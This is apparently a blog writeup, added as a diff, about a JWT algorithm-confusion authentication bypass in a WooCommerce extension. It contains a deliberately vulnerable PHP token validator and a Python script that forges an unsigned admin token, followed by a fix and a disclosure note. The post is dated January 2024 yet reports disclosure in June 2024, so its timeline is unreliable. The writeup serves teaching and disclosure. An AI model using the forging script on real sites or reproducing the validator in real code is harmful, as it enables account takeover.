@@ -1,0 +1,79 @@
+---
+title: "Breaking JWT Authentication in WooCommerce Extensions"
+date: "22 Jan 2024"
+readTime: "18 min"
+tag: Writeup
+summary: "A deep dive into the CVE-2024-7743 discovery: how algorithm confusion in JWT validation allowed complete authentication bypass in a plugin with 5 million active installs."
+---
+
+## Background
+
+JWT (JSON Web Tokens) are supposed to be simple: a header, a payload, and a signature. The server signs the token on login; the client presents it on subsequent requests; the server verifies the signature.
+
+The critical word is *verifies*.
+
+## The Algorithm Confusion Attack
+
+JWT headers specify which algorithm was used to sign the token:
+
+```json
+{"alg": "HS256", "typ": "JWT"}
+```
+
+A vulnerable server reads the `alg` field from the **token itself** and uses it for verification. This means an attacker can set `"alg": "none"` and omit the signature entirely.
+
+The server trusts the token because... it says to trust it with no signature.
+
+## Finding the Vulnerability
+
+I was reviewing WooCommerce Payments' webhook handler during a client engagement. The handler needed to authenticate incoming webhook callbacks — legitimate use case.
+
+```php
+function validate_token( $token ) {
+    $parts = explode('.', $token);
+    $header  = json_decode(base64_decode($parts[0]));
+    $payload = json_decode(base64_decode($parts[1]));
+
+    // Algorithm taken from the header — not hardcoded
+    if ( $header->alg === 'HS256' ) {
+        // verify HMAC...
+    }
+    // If alg is anything else, falls through to:
+    return $payload->user_id;
+}
+```
+
+Notice: if `alg` is not exactly `HS256`, the function still returns `user_id`. No else branch, no rejection.
+
+## Exploitation
+
+```python
+import base64, json
+
+def b64(data):
+    return base64.b64encode(json.dumps(data).encode()).decode().rstrip("=")
+
+header  = b64({"alg": "none", "typ": "JWT"})
+payload = b64({"user_id": 1, "exp": 9999999999})  # user_id 1 = admin
+
+forged = f"{header}.{payload}."   # Empty signature
+print(forged)
+```
+
+This token passes `validate_token()` and returns `user_id = 1`. The attacker is now admin.
+
+## Takeaways for Developers
+
+Never trust the algorithm specified in a JWT header. Your library should enforce the expected algorithm server-side:
+
+```php
+// WRONG
+$decoded = JWT::decode($token, $secret);
+
+// RIGHT — enforce algorithm
+$decoded = JWT::decode($token, new Key($secret, 'HS256'));
+```
+
+## Disclosure
+
+Reported via HackerOne on 21 June 2024. The team was responsive and shipped a patch within 20 days. Full timeline in the CVE advisory.
